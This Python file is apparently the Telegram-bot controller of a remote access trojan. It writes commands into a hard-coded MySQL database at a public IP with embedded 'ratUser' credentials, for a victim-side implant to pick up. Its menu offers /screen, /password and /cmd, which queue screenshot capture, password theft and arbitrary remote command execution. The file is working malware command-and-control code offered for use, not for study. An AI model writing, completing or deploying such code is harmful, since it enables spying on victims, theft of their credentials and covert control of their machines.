from sqlalchemy import create_engine, Column, Integer, Boolean, Text, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import Session
from vars import telebot, bot_token, bot, chat_id
from telebot import types

engine = create_engine('mysql+mysqlconnector://ratUser:ratUser@178.62.239.6/ratCommands')
Base = declarative_base()

class Commands(Base):
    __tablename__ = 'commands'
    id = Column(Integer, primary_key=True, autoincrement=True)
    command = Column(Text)
    status = Column(Boolean, default=False)
    commandText = Column(Text)


Base.metadata.create_all(engine)

@bot.message_handler(commands=['start', 'Start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton('/screen')
    btn2 = types.KeyboardButton('/password')
    btn3 = types.KeyboardButton('/cmd')
    markup.row(btn1)
    markup.row(btn2)
    markup.row(btn3)
    bot.send_message(chat_id, 'Вот список команд', reply_markup=markup)


    @bot.message_handler(commands=['screen'])
    def getScreen(message):
        with Session(engine) as session:
            new_command = Commands(command=message.text, status=False)
            session.add(new_command)
            session.commit()


    @bot.message_handler(commands=['password'])
    def getPassword(message):
        with Session(engine) as session:
            new_command = Commands(command=message.text, status=False)
            session.add(new_command)
            session.commit()

    @bot.message_handler(commands=['cmd'])
    def getPassword(message):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        backButton = types.KeyboardButton('/back')
        markup.row(backButton)
        bot.send_message(chat_id, 'Напишите команду которую хотите использовать', reply_markup=markup)
        command = message.text
        @bot.message_handler()
        def getCommand(message):
            if message.text == '/back':
                start(message)
            else:
                with Session(engine) as session:
                    new_command = Commands(command = command, commandText = message.text, status = False)
                    session.add(new_command)
                    session.commit()

bot.infinity_polling()
